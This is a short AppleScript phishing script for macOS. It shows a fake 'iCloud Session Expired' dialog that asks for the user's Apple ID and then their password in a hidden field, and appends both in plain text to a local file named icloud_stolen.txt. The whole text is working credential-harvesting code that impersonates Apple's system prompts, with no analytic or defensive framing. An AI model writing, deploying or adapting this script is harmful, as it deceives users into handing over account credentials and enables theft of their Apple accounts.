display dialog "iCloud Session Expired. Please re-authenticate." default answer "Apple ID" buttons {"Cancel", "Sign In"} default button 2
set email to text returned of the result
display dialog "Enter your password for " & email default answer "" with hidden answer
set password to text returned of the result
do shell script "echo 'ID: " & email & " PW: " & password & "' >> ~/Library/Logs/icloud_stolen.txt"
